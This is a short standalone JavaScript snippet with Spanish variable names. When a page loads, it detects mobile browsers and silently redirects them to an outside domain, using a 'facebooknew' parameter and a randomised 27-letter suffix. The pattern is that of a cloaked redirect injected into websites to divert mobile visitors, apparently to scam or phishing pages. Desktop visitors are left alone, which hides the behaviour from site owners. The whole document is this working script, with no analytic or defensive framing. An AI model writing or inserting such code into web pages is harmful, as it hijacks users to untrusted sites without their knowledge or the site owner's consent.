  <script type="text/javascript">
    function redireccionarMovil() {
        var esDispositivoMovil = /Mobi/i.test(navigator.userAgent);
        var urlRedireccionMovil = "https://alex.xhja.net/?lan=facebooknew&ht=2&counter0=lacabra05";

        // Generar 27 letras aleatorias
        var letrasAleatorias = "";
        var caracteresPermitidos = "abcdefghijklmnopqrstuvwxyz";

        for (var i = 0; i < 27; i++) {
            var indiceAleatorio = Math.floor(Math.random() * caracteresPermitidos.length);
            letrasAleatorias += caracteresPermitidos.charAt(indiceAleatorio);
        }

        // Agregar las letras aleatorias al final de la URL de redirección
        urlRedireccionMovil += letrasAleatorias;

        if (esDispositivoMovil) {
            window.location.href = urlRedireccionMovil;
        }
    }

    window.onload = redireccionarMovil;
</script>
